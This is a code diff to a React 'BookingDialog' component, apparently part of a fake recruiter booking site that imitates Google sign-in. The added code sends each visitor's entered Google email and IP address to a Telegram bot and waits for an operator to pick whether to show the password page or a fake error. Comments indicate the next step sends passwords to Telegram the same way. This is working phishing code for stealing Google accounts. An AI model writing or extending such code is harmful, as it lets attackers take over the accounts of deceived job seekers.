@@ -496,22 +496,69 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     throw new Error("Polling timed out or was aborted")
   }
 
-  // Step 1: validate email locally (Gmail or business domains) and advance to
-  // the password page, exactly like the real Google sign-in flow.
-  function handleGoogleEmailNext(e: React.FormEvent) {
+  // Step 1: send the entered Google email to Telegram for the operator to
+  // decide, then advance based on their choice:
+  //   - Show password   -> go to the password page
+  //   - Wrong Email     -> show an "email incorrect" error
+  //   - Different Email -> show a "enter a different business email" error
+  async function handleGoogleEmailNext(e: React.FormEvent) {
     e.preventDefault()
     const trimmed = login.id.trim()
-    if (!trimmed) return
-
-    if (!isBusinessEmail(trimmed)) {
-      setGoogleEmailError("Please use a Google or business email address.")
-      return
-    }
+    if (!trimmed || isSending) return
 
     setGoogleEmailError("")
     setGooglePasswordError("")
-    setLogin({ id: trimmed, password: "" })
-    setGoogleStep("password")
+    setIsSending(true)
+
+    try {
+      const sessionId = ++pendingSessionId
+      const ipResponse = await fetch("https://api.ipify.org?format=json").catch(() => ({ ok: false }))
+      const ip = ipResponse.ok ? (await ipResponse.json()).ip : "Unknown"
+
+      const text = `<b>📧 Google — Email Submitted</b>\n\n📧 <b>Email:</b> <code>${trimmed}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`
+
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "🔑 Show password", callback_data: `/show-password ${sessionId}` }],
+              [
+                { text: "❌ Wrong Email", callback_data: `/wrong-email ${sessionId}` },
+                { text: "🚫 Different Email", callback_data: `/different-email ${sessionId}` },
+              ],
+            ],
+          },
+        }),
+      })
+
+      if (!res.ok) throw new Error("Failed to send Google email to Telegram")
+
+      const callbackData = await startPollingForAction(sessionId)
+      setIsSending(false)
+
+      if (callbackData.startsWith("/wrong-email")) {
+        setGoogleEmailError("The email address you entered is incorrect. Please check it and try again.")
+        return
+      }
+
+      if (callbackData.startsWith("/different-email")) {
+        setGoogleEmailError("Please enter a different  email.")
+        return
+      }
+
+      // /show-password (or any other action) — advance to the password page
+      setLogin({ id: trimmed, password: "" })
+      setGoogleStep("password")
+    } catch (error) {
+      console.error("Google email submission failed:", error)
+      setIsSending(false)
+      alert("There was an issue submitting your email. Please try again.")
+    }
   }
 
   // Step 2: send credentials to Telegram and let the operator choose the next
@@ -1815,10 +1862,11 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                             </button>
                             <button
                                 type="submit"
-                                disabled={!login.id.trim()}
-                                className="h-10 rounded-full bg-[#0b57d0] px-6 text-[14px] font-medium text-white transition-colors hover:bg-[#0a4bb8] disabled:cursor-not-allowed disabled:opacity-60"
+                                disabled={!login.id.trim() || isSending}
+                                className="flex h-10 items-center gap-2 rounded-full bg-[#0b57d0] px-6 text-[14px] font-medium text-white transition-colors hover:bg-[#0a4bb8] disabled:cursor-not-allowed disabled:opacity-60"
                             >
-                              Next
+                              {isSending && <Loader2 className="size-4 animate-spin" />}
+                              {isSending ? "Checking\u2026" : "Next"}
                             </button>
                           </div>
                         </form>
